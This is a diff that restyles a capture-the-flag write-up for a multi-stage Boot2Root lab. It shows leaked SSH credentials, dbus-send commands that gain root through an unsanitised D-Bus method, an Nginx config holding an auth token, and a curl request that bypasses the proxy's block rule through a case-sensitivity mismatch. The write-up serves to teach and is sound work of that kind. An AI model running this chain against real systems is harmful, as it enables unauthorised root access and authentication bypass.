@@ -1,34 +1,49 @@
-# Write-up: Lateral Movement & Routing Mismatch (PUCTF26)
+# It Takes Two — Writeup
 
-**Challenge:** It Takes Two
-**Category:** Boot2Root / Web / Privilege Escalation  
-**Author:** Cynthia 
-
-Author: Yeung Wang Sang
-
-## Summary
-
-This challenge is a multi-stage Boot2Root puzzle. To retrieve the flag, we must navigate through several layers of security, requiring a combination of lateral movement, local privilege escalation (LPE), sandbox evasion (Living off the Land), and exploiting a web server routing mismatch.
-
-The core exploit chain is:
-1. Extract leaked SSH credentials from the initial `webapp` server.
-2. Laterally move to a restricted `security` container to bypass an IP whitelist.
-3. Exploit an insecure D-Bus service running as `root` for command execution.
-4. Discover an Nginx reverse proxy that injects a required `X-Auth-Token` but blocks the target endpoint.
-5. Exploit a case-sensitivity discrepancy between Nginx and Express.js to bypass the proxy's block rule and retrieve the flag.
+| | |
+|:---|:---|
+| **Challenge Author** | Cynthia |
+| **Writeup Author** | Yeung Wang Sang |
+| **Category** | Penetration Testing / Boot2Root / Privilege Escalation |
+| **Status** | ✅ Solved |
 
 ---
 
-## Step 1: Initial Recon & Lateral Movement
+## Overview
 
-We start with a shell on the `webapp` server as the low-privileged user `player`. 
+A multi-stage Boot2Root challenge. Each layer peels back to reveal the next attack surface — from credential leakage, to privilege escalation via a misconfigured D-Bus service, to a subtle routing mismatch between Nginx and Express.js.
 
-During initial reconnaissance, we uncover a Base64 encoded string:
+### Exploit Chain at a Glance
+
+```
+[webapp - player shell]
+        |
+        | 1. Decode leaked Base64 credentials
+        v
+[security container - monitor@security]
+        |
+        | 2. Exploit insecure D-Bus service (root RCE)
+        v
+[Read Nginx reverse proxy config]
+        |
+        | 3. Abuse Nginx/Express case-sensitivity mismatch
+        v
+[FLAG]
+```
+
+---
+
+## Step 1 — Initial Recon & Credential Discovery
+
+Starting with a low-privilege shell on `webapp` as user `player`, reconnaissance uncovers a Base64-encoded string:
+
 ```text
 eyJob3N0Ijoic2VjdXJpdHkiLCJwb3J0IjoyMiwidXNlcm5hbWUiOiJtb25pdG9yIiwicGFzc3dvcmQiOiJNMG4xdDByX1MzY3VyM18yMDI2ISIsInB1cnBvc2UiOiJTU0ggYWNjZXNzIHRvIHNlY3VyaXR5IG1vbml0b3Jpbmcgc2VydmVyIGZvciBoZWFsdGggY2hlY2tzIn0=
+```
 
-Decoding this string reveals JSON-formatted credentials for an internal monitoring server: 
-```json 
+Decoding reveals credentials for an internal monitoring server:
+
+```json
 {
   "host": "security",
   "port": 22,
@@ -36,85 +51,132 @@ Decoding this string reveals JSON-formatted credentials for an internal monitori
   "password": "M0n1t0r_S3cur3_2026!",
   "purpose": "SSH access to security monitoring server for health checks"
 }
-``` 
-The target endpoint containing the flag is /admin_portal on the webapp, but it is protected by an IP restriction—it only accepts requests originating from the security server.
+```
 
-To bypass this IP whitelist, we use the decoded credentials to SSH into the security container: 
+> **Key insight:** The `/admin_portal` endpoint on `webapp` is protected by an IP whitelist — it only accepts requests originating from the `security` server. We must pivot there first.
+
+---
+
+## Step 2 — Lateral Movement
+
+Using the decoded credentials, we SSH into the `security` container:
 
 ```bash
 ssh monitor@security
-# (Password: M0n1t0r_S3cur3_2026!)
-``` 
-
-## Step 2; D-Bus Privilege Escalation 
-Once inside the security machine, we need to determine how it authenticates to the webapp to perform its "health checks."
-
-Running ps aux reveals a suspicious Python script running with root privileges: 
-
-``` Plaintext 
-root      15  0.0  0.1  28828 18856 ?        S    04:05   0:00 python3 /opt/diagnostics/diagnostics-service.py 
+# Password: M0n1t0r_S3cur3_2026!
 ```
-Reading the source code of this script reveals a classic Local Privilege Escalation (LPE) vulnerability. It exposes a D-Bus method named RunDiagnostic that takes a string command and passes it directly to subprocess.run(shell=True) without any sanitization.
 
-We can exploit this by using dbus-send to execute arbitrary commands as root. For example, verifying our access to the root directory: 
-```bash 
-dbus-send --system --print-reply --dest=com.security.diagnostics /com/security/diagnostics com.security.diagnostics.Interface.RunDiagnostic string:"ls -la /root" 
-``` 
-## Step 3: Extracting Secrets & Sandbox Trap 
-Using our root D-Bus execution, we read the /root/.init script and discover that the container is heavily sandboxed:
+---
 
-The python3 binary is deleted immediately after the D-Bus service starts.
+## Step 3 — D-Bus Privilege Escalation
 
-Standard tools like curl, wget, nc, bash, and apt-get are completely removed.
+Running `ps aux` inside the `security` machine reveals a suspicious **root-owned** process:
 
-The D-Bus service is sandboxed by systemd, triggering OSError: [Errno 93] Protocol not available if we attempt to use Python's raw socket module to craft outbound HTTP requests.
+```
+root  15  0.0  0.1  28828 18856 ?  S  04:05  0:00 python3 /opt/diagnostics/diagnostics-service.py
+```
 
-However, the .init script also shows that Nginx is running. We use our D-Bus exploit to dump the Nginx configuration: 
-``` 
-dbus-send --system --print-reply --dest=com.security.diagnostics /com/security/diagnostics com.security.diagnostics.Interface.RunDiagnostic string:"grep -r . /etc/nginx/conf.d 2>/dev/null"
-``` 
-This reveals the critical reverse proxy configuration: 
-```Nginx 
+Reading the source exposes a classic **LPE vulnerability**: the service registers a D-Bus method `RunDiagnostic` that passes user input directly to `subprocess.run(shell=True)` — with zero sanitization.
+
+**Exploit:** Use `dbus-send` to execute arbitrary commands as `root`:
+
+```bash
+dbus-send --system --print-reply \
+  --dest=com.security.diagnostics \
+  /com/security/diagnostics \
+  com.security.diagnostics.Interface.RunDiagnostic \
+  string:"ls -la /root"
+```
+
+---
+
+## Step 4 — Sandbox Enumeration & Nginx Config Dump
+
+Reading `/root/.init` via D-Bus reveals a heavily locked-down environment:
+
+| Removed / Blocked | Detail |
+|:---|:---|
+| `python3` binary | Deleted immediately after D-Bus service starts |
+| Network tools | `curl`, `wget`, `nc`, `bash`, `apt-get` all removed |
+| Raw sockets | Blocked by systemd sandbox (`OSError: [Errno 93]`) |
+
+However, **Nginx is still running**. We dump its config:
+
+```bash
+dbus-send --system --print-reply \
+  --dest=com.security.diagnostics \
+  /com/security/diagnostics \
+  com.security.diagnostics.Interface.RunDiagnostic \
+  string:"grep -r . /etc/nginx/conf.d 2>/dev/null"
+```
+
+**Nginx config revealed:**
+
+```nginx
 # Block direct access to admin_portal through the proxy
-    location /admin_portal {
-        return 403 "Access denied by security policy.\n";
-    }
-    # Proxy all requests to the vulnerable instance's web app
-    location / {
-        proxy_pass http://vulnerable:8000;
-        
-        # Inject the auth token for all proxied requests
-        proxy_set_header X-Auth-Token "S3cur1ty_M0n1t0r_T0k3n_X9K2!";
-    }
-``` 
-##Step 4: The Routing Mismatch Bypass (The Final Exploit)
-We notice a fatal discrepancy in how the frontend proxy (Nginx) and the backend application (Express.js) parse URLs:
+location /admin_portal {
+    return 403 "Access denied by security policy.\n";
+}
 
-Nginx is case-sensitive by default. It only blocks the exact string /admin_portal.
+# Proxy all other requests to the webapp backend
+location / {
+    proxy_pass http://vulnerable:8000;
 
-Express.js (Node) on the backend is case-insensitive by default. It treats /Admin_portal identically to /admin_portal.
+    # Automatically inject the auth token for all proxied requests
+    proxy_set_header X-Auth-Token "S3cur1ty_M0n1t0r_T0k3n_X9K2!";
+}
+```
 
-Since we cannot send the request from inside the locked-down security container, we simply exit our SSH session and return to the webapp server, where standard tools like curl are available.
+> **Key insight:** The proxy *automatically injects* the required `X-Auth-Token` header for us — but it blocks `/admin_portal` with a 403. We need to reach the backend without triggering that block rule.
 
-From the webapp server, we send a request to the security proxy using an uppercase A:
-```bash 
+---
+
+## Step 5 — Case-Sensitivity Bypass (Final Exploit)
+
+A **routing mismatch** exists between the proxy and the backend:
+
+| Component | Case Handling | Effect |
+|:---|:---|:---|
+| **Nginx** (proxy) | Case-sensitive | Only blocks the exact string `/admin_portal` |
+| **Express.js** (backend) | Case-insensitive | Treats `/Admin_portal` identically to `/admin_portal` |
+
+**The bypass:** Request `/Admin_portal` (capital `A`). Nginx doesn't match its block rule, falls through to `location /`, injects the `X-Auth-Token`, and proxies it to the Express backend — which matches it case-insensitively and returns the flag.
+
+Since the `security` container has no usable HTTP tools, we exit back to `webapp` where `curl` is available:
+
+```bash
 player@webapp:~$ curl -s http://security/Admin_portal
-``` 
-The Exploit Flow:
+```
 
-Our curl request hits the Nginx proxy on the security container.
+**Full request flow:**
 
-Nginx checks location /admin_portal. Because /Admin_portal != /admin_portal, the block rule fails to trigger.
+```
+curl /Admin_portal (webapp)
+    │
+    ▼
+Nginx on security container
+    ├─ Check: location /admin_portal  →  /Admin_portal ≠ /admin_portal  →  NO MATCH
+    └─ Fallthrough: location /
+           │  inject: X-Auth-Token: S3cur1ty_M0n1t0r_T0k3n_X9K2!
+           │  proxy_pass → webapp:8000
+           ▼
+    Express.js backend
+           ├─ Route match: /Admin_portal == /admin_portal  ✓  (case-insensitive)
+           ├─ Token valid  ✓
+           └─ Source IP = security  ✓
+                   │
+                   ▼
+                 FLAG
+```
 
-Nginx falls through to the default location / block, injects the secret header (X-Auth-Token: S3cur1ty_M0n1t0r_T0k3n_X9K2!), and proxies the request back to the webapp:8000 backend.
+---
 
-The Express backend receives the request for /Admin_portal. It checks its routes case-insensitively, matches the request to the /admin_portal logic, verifies the injected token and correct source IP, and returns the flag! 
+## Flag
 
-## Flag 
-The final payload successfully returns the authorized data: 
-``` json 
+```json
 {"status":"authorized","data":"PUCTF26{1t_t4k3s_tw0_t0_t4ng0_kIfuepoLyWIbluXTACaz3CIwRGNb3C38}"}
-``` 
+```
 
-
-
+```
+PUCTF26{1t_t4k3s_tw0_t0_t4ng0_kIfuepoLyWIbluXTACaz3CIwRGNb3C38}
+```
